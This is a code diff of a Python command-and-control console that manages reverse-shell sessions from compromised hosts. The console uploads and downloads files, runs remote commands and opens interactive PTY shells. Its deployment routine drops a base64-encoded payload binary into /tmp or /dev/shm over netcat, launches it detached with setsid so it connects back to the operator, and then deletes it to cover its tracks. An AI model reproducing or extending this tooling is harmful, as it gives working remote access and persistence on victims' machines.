@@ -1,11 +1,12 @@
 #!python3
 
+from modules.nethelper import pretty, PyServerSocket, BashServerSocket, SendPayload
 from modules.utils import send_file, chk_payload, local_shell
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import pretty, PyServerSocket, BashServerSocket
 from modules.shell import RawShell
-from threading import Thread
+from rich.console import Console
 from modules.commands import ls
+from threading import Thread
 
 import logging
 import signal
@@ -19,7 +20,9 @@ import os
 
 logging.basicConfig(level=logging.DEBUG)
 sys.dont_write_bytecode = True
+console = Console()
 PROJ_DIR = os.path.dirname(os.path.realpath(__file__))
+
 class Shell():
     def __init__(self, socket):
         self.socket = socket
@@ -38,9 +41,7 @@ class NetShell(cmd.Cmd):
         self.id = None
         self.output = None
         self.shell_active = True
-
         Thread(target=self.is_alive).start()
-
 
     def default(self, line):
         local_shell(line)
@@ -100,7 +101,6 @@ class NetShell(cmd.Cmd):
                 if len(data) == 0:
                     raise ConnectionError
             except (BlockingIOError, AttributeError):
-                # This means the socket is still open but there's no data to receive
                 pass
             except (ConnectionError, OSError, ValueError):
                 logging.error(f"Session {self.id +1}: Connection lost")
@@ -119,42 +119,48 @@ class NetShell(cmd.Cmd):
 
     def do_ls(self, line):
         try:
-            data = pretty(self.socket.send_command(f"ls {line}"))
-            ls(json.loads(data))
+            is_err, _data = self.socket.send_command(f"ls {line}")
+            data = pretty(_data)
+            if is_err:
+                sys.stdout.write(f"{data}\n")
+            else:
+                console.print(ls(json.loads(data)))
         except BrokenPipeError:
             self.do_exit("")
 
-    def do_alive(self, line):
-        print(pretty(self.socket.send_command("aliv")))
-
-    def do_send(self, line): # DOES NOT WORK
-        check = self.socket.send_command(f"sendingfile {line}")
+    def do_put(self, line):
+        filename = line.split("/")[-1]
+        check = self.socket.send_command(f"put_file {filename}")
+        time.sleep(2)
         if b"ready" in check:
-            with open(line, 'rb') as f:
-                while (chunk := f.read(1024)):
-                    self.socket.client_socket.send(chunk)
+            with open(line, "r") as f:
+                self.socket.send_msg(f.read())
 
     def do_get(self, line):
-        contents = pretty(self.socket.send_command(f"gettingfile {line}"))
-        if contents:
-            with open(line.split("/")[-1], 'w') as f:
-                f.write(f"{contents}\n")
+        is_err, _data = self.socket.send_command(f"get_file {line}")
+        data = pretty(_data)
+        if not is_err:
+            with open(line.split("/")[-1], "w") as f:
+                f.write(f"{data}\n")
+        else:
+            sys.stdout.write(f"{data}\n")
 
     def do_run(self, line):
-        self.output = pretty(self.socket.send_command(line))
-        if self.output:
-            sys.stdout.write(f"{self.output}\n")
+        is_err, _data = self.socket.send_command(f"cmd {line}")
+        data = pretty(_data)
+        if data:
+            sys.stdout.write(f"{data}\n")
 
     def do_shell(self, line):
         self.socket.send_command(f"shell")
-        with self.socket.lock:
-            RawShell(self.socket, pty=True).run()
+        RawShell(self.socket, pty=True).run()
         return
     
     def do_cd(self, line):
-        self.output = pretty(self.socket.send_command(f"cd {line}"))
-        if self.output:
-            sys.stdout.write(f"{self.output}\n")
+        is_err, _data = self.socket.send_command(f"cd {line}")
+        data = pretty(_data)
+        if data:
+            sys.stdout.write(f"{data}\n")
 
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
@@ -176,10 +182,6 @@ class LocalShell(cmd.Cmd):
         self.current_session = None
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
-
-        if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
-            logging.warning('Warning: Binary file "payload" is not present.')
-            chk_payload(PROJ_DIR)
 
     def default(self, line):
         local_shell(line)
@@ -271,26 +273,27 @@ class LocalShell(cmd.Cmd):
         sock.sysinfo = SystemInfoGatherer()
         # sock.sysinfo.binaryGatherer(sock)
 
-        # TODO: Make it so that if there 
-        sock.sysinfo.is_nc = pretty(sock.send_command("which nc"))
         if not raw_shell:
             try:
                 logging.info(f"Sending payload")
 
-                test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
-                send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
-                time.sleep(1)
+                payload_con = SendPayload(sock)
+                sock.send_command("cd /tmp || cd /var/tmp || cd /dev/shm")
+                payload_con.listen(host)
+                payload_con.send_file(os.path.join(PROJ_DIR, "payloads/payload"))
+                logging.info(f"File sent")
+
                 test = pretty(sock.send_command("./payload --test"))
 
                 if not test == "Hello world! Wasd":
                     logging.error("Thing did not run")
                     raise Exception
 
+                logging.debug(f"Payload sent. Starting listener")
                 sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
 
                 sock.server_socket.close()
                 sock.client_socket.close()
-                logging.debug(f"Payload sent. Starting listener")
 
                 sock = PyServerSocket()
 
@@ -314,7 +317,7 @@ class LocalShell(cmd.Cmd):
                     return
 
                 if not sock: return
-                sock.send_command("rm -rf payload")
+                sock.send_command("cmd rm -rf payload")
                 self.current_session = NetShell(sock)
                 self.current_session.session_type = "python"
             except Exception as e:
@@ -383,4 +386,9 @@ class LocalShell(cmd.Cmd):
 
 
 if __name__ == "__main__":
+    if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
+        logging.warning('Warning: Binary file "payload" is not present.')
+        chk_payload(PROJ_DIR)
+        sys.exit()
+
     LocalShell().cmdloop_with_sigint()
